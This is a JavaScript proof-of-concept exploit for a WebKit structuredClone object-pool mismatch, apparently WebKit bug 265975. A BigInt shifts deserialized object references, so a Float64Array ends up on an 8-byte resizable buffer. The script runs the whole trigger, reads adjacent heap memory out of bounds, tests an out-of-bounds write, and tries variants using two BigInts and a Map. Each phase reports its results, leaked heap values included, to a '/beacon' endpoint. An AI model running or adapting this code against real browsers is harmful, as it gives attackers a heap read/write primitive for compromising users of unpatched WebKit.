// p285 — structuredClone object-pool mismatch → TypedArray OOB
//
// Bug: WebKit bug 265975 (fixed 2024-01-26 by Mark Lam)
// WebKit-1200 (Dec 2023) does NOT have the fix.
//
// Root cause: m_gcBuffer serves dual purpose in CloneDeserializer:
//   1. Object pool for ObjectReferenceTag index resolution
//   2. GC keep-alive buffer
// BigInt deserialization appends to m_gcBuffer but the serializer does NOT
// add BigInts to its m_objectPool. This shifts all subsequent
// ObjectReference indices by 1 per BigInt.
//
// Exploit: Put a BigInt before two ResizableArrayBuffers (small + large).
// A Float64Array references the large buffer via ObjectReference.
// Due to the shift, the ObjectReference resolves to the small buffer.
// Since the buffer is resizable, verifySubRangeLength is skipped.
// Result: Float64Array(1024 elements) on an 8-byte buffer = OOB R/W.
//
// USE_BIGINT32 = 0 in WebKit-1200 → every BigInt goes through heap path
// and appends to m_gcBuffer, even 0n.
//
// Beacon prefix: V285-

(function() {
  var BQ = 0;
  function B(tag, body) {
    var url = '/beacon/V285-' + tag + '?t=' + Date.now() + '&q=' + (BQ++);
    try {
      if (body !== undefined && String(body).length < 1500) {
        var x = new XMLHttpRequest();
        x.open('POST', url, true);
        x.send(String(body));
      } else {
        new Image().src = url;
      }
    } catch(e) { try { new Image().src = url; } catch(e2) {} }
  }

  function hex32(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  function hex64(hi, lo) {
    return hex32(hi) + hex32(lo);
  }

  B('BOOT');

  // ===== Phase 0: Feature detection =====
  try {
    var testBigInt = 0n;
    B('P0-BIGINT-OK');
  } catch(e) {
    B('P0-BIGINT-FAIL');
    return;
  }

  try {
    var testRAB = new ArrayBuffer(8, {maxByteLength: 64});
    B('P0-RAB-OK-' + testRAB.byteLength + '-' + testRAB.maxByteLength);
  } catch(e) {
    B('P0-RAB-FAIL-' + e.message.substring(0, 40));
    return;
  }

  try {
    var testClone = structuredClone({x: 1});
    B('P0-SC-OK');
  } catch(e) {
    B('P0-SC-FAIL-' + e.message.substring(0, 40));
    return;
  }

  // ===== Phase 1: Trigger the pool mismatch =====
  //
  // Serializer pool order:
  //   pool[0] = outer object
  //   pool[1] = ab_small (first ArrayBuffer, serialized inline)
  //   pool[2] = ab_large (second ArrayBuffer, serialized inline)
  //   pool[3] = view (Float64Array, references ab_large via ObjectRef(2))
  //
  // Deserializer gcBuffer (unfixed):
  //   gcBuffer[0] = outer object
  //   gcBuffer[1] = BigInt  ← EXTRA! (not in serializer pool)
  //   gcBuffer[2] = ab_small
  //   gcBuffer[3] = ab_large
  //   gcBuffer[4] = view
  //
  // When view's ObjectReferenceTag(2) is read:
  //   gcBuffer.at(2) = ab_small (should be ab_large!)
  //   → Float64Array wrappedAs(ab_small, 0, 1024) with resizable skip = OOB!

  try {
    var SMALL_SIZE = 8;
    var LARGE_SIZE = 8192;
    var MAX_SIZE = 65536;
    var ELEMENT_COUNT = LARGE_SIZE / 8; // 1024 Float64 elements

    var ab_small = new ArrayBuffer(SMALL_SIZE, {maxByteLength: MAX_SIZE});
    var ab_large = new ArrayBuffer(LARGE_SIZE, {maxByteLength: MAX_SIZE});

    // Fill small buffer with sentinel
    var dv_small = new DataView(ab_small);
    dv_small.setFloat64(0, 1.234567890, true);

    // Fill large buffer with pattern
    var view_large = new Float64Array(ab_large);
    for (var i = 0; i < ELEMENT_COUNT; i++) {
      view_large[i] = i + 1;
    }

    // The payload: BigInt → ab_small → ab_large → view_on_ab_large
    var payload = {
      bigint_shift: 0n,                    // shifts deserializer pool by 1
      buf_small: ab_small,                 // serializer pool[1], deserialized gcBuffer[2]
      buf_large: ab_large,                 // serializer pool[2], deserialized gcBuffer[3]
      typed_view: new Float64Array(ab_large) // references ab_large via ObjectRef(2)
                                            // deserializer resolves to ab_small (gcBuffer[2])
    };

    B('P1-CLONING');
    var cloned;
    try {
      cloned = structuredClone(payload);
    } catch(e) {
      B('P1-CLONE-ERR-' + e.message.substring(0, 60));
      // Try with larger BigInt to ensure heap allocation
      try {
        payload.bigint_shift = 0x100000000n; // > INT32_MAX
        cloned = structuredClone(payload);
      } catch(e2) {
        B('P1-CLONE-ERR2-' + e2.message.substring(0, 60));
        return;
      }
    }
    B('P1-CLONED');

    // ===== Phase 2: Check if the mismatch worked =====
    var tv = cloned.typed_view;
    var bs = cloned.buf_small;
    var bl = cloned.buf_large;

    B('P2-VIEW-LEN-' + tv.length);
    B('P2-VIEW-BYTELEN-' + tv.byteLength);
    B('P2-SMALL-LEN-' + bs.byteLength);
    B('P2-LARGE-LEN-' + bl.byteLength);

    // Check if view is backed by the small buffer (OOB condition)
    // If the bug worked, tv.buffer === bs (not bl)
    var viewBuf = tv.buffer;
    var isSmall = (viewBuf.byteLength === SMALL_SIZE);
    var isLarge = (viewBuf.byteLength === LARGE_SIZE);
    B('P2-VIEWBUF-' + viewBuf.byteLength);
    B('P2-IS-SMALL-' + isSmall);
    B('P2-IS-LARGE-' + isLarge);

    if (isSmall && tv.length === ELEMENT_COUNT) {
      B('P2-OOB-CONFIRMED');

      // ===== Phase 3: OOB read to leak heap data =====
      // tv has 1024 elements (8192 bytes) but buffer is only 8 bytes
      // Reading past element 0 is OOB into adjacent heap memory

      var leakData = [];
      for (var k = 0; k < Math.min(tv.length, 64); k++) {
        try {
          var val = tv[k];
          if (val !== undefined && val !== 0) {
            // Read raw bits
            var tmpBuf = new ArrayBuffer(8);
            var tmpF64 = new Float64Array(tmpBuf);
            var tmpDV = new DataView(tmpBuf);
            tmpF64[0] = val;
            var hi = tmpDV.getUint32(4, true);
            var lo = tmpDV.getUint32(0, true);
            leakData.push(k + ':' + hex64(hi, lo));
          }
        } catch(e) {
          leakData.push(k + ':ERR');
          break;
        }
      }
      B('P3-LEAK', leakData.slice(0, 20).join(' '));
      if (leakData.length > 20) {
        B('P3-LEAK2', leakData.slice(20, 40).join(' '));
      }

      // ===== Phase 4: Try OOB write for heap corruption =====
      // Write a marker at offset 16 (element 2) to see if we can write OOB
      try {
        tv[2] = 3.14159;
        B('P4-WRITE-OK');
      } catch(e) {
        B('P4-WRITE-ERR-' + e.message.substring(0, 40));
      }

      // ===== Phase 5: Verify OOB write persisted =====
      try {
        var readBack = tv[2];
        var tmpBuf2 = new ArrayBuffer(8);
        new Float64Array(tmpBuf2)[0] = readBack;
        var dv2 = new DataView(tmpBuf2);
        B('P5-READBACK-' + hex64(dv2.getUint32(4, true), dv2.getUint32(0, true)));
      } catch(e) {
        B('P5-READBACK-ERR');
      }

      B('OOB-PRIMITIVE-LIVE');

    } else if (isLarge) {
      B('P2-NO-MISMATCH');
      // The bug didn't trigger — pool indices matched correctly
      // This means either the bug is patched or BigInt doesn't shift

      // Diagnostic: check if view[0] has the expected value
      B('P2-DIAG-V0-' + tv[0]);
      B('P2-DIAG-V1-' + tv[1]);
    } else {
      B('P2-UNEXPECTED-BUFSIZE-' + viewBuf.byteLength);
    }

  } catch(e) {
    B('P1-OUTER-ERR-' + e.message.substring(0, 60));
  }

  // ===== Phase 6: Multi-shift test (2 BigInts) =====
  // If single BigInt didn't work, try with 2 to shift by 2
  try {
    var ab_s2 = new ArrayBuffer(16, {maxByteLength: MAX_SIZE});
    var ab_m2 = new ArrayBuffer(256, {maxByteLength: MAX_SIZE});
    var ab_l2 = new ArrayBuffer(4096, {maxByteLength: MAX_SIZE});
    var v2 = new Float64Array(ab_l2);
    for (var j = 0; j < v2.length; j++) v2[j] = j + 0.5;

    // 2 BigInts before the buffers → shift by 2
    // ObjectRef for ab_l2 is at pool[3] in serializer
    // In deserializer: gcBuffer[3+2] = gcBuffer[5] = ab_l2
    // But ObjectRef(3) → gcBuffer[3] = ab_s2 (shifted by 2)
    var payload2 = {
      bi1: 1n,
      bi2: 2n,
      s: ab_s2,       // pool[1] → gcBuffer[3]
      m: ab_m2,       // pool[2] → gcBuffer[4]
      l: ab_l2,       // pool[3] → gcBuffer[5]
      view2: v2       // ObjectRef(3) for ab_l2 → gcBuffer[3] = ab_s2!
    };

    var c2 = structuredClone(payload2);
    var vb2 = c2.view2.buffer;
    B('P6-VIEWBUF2-' + vb2.byteLength);
    B('P6-VIEW2-LEN-' + c2.view2.length);
    if (vb2.byteLength === 16 && c2.view2.length === 512) {
      B('P6-OOB-SHIFT2-CONFIRMED');
    }
  } catch(e) {
    B('P6-ERR-' + e.message.substring(0, 40));
  }

  // ===== Phase 7: Alternative — Map/Set iterator shift =====
  // The fix also removed JSMapIterator/JSSetIterator keep-alive appends
  // Test if Map entries cause a shift
  try {
    var ab_a = new ArrayBuffer(8, {maxByteLength: MAX_SIZE});
    var ab_b = new ArrayBuffer(4096, {maxByteLength: MAX_SIZE});
    var v3 = new Float64Array(ab_b);
    for (var j2 = 0; j2 < v3.length; j2++) v3[j2] = j2 + 100;

    var testMap = new Map();
    testMap.set('x', ab_a);

    var payload3 = {
      map: testMap,    // Map + iterator entries may shift pool
      buf: ab_b,       // serialized inline
      view3: v3        // references ab_b via ObjectRef
    };

    var c3 = structuredClone(payload3);
    var vb3 = c3.view3.buffer;
    B('P7-MAP-VIEWBUF-' + vb3.byteLength);
    B('P7-MAP-VIEW-LEN-' + c3.view3.length);
    if (vb3.byteLength !== 4096) {
      B('P7-MAP-SHIFT-DETECTED-' + vb3.byteLength);
    }
  } catch(e) {
    B('P7-MAP-ERR-' + e.message.substring(0, 40));
  }

  B('DONE');
})();
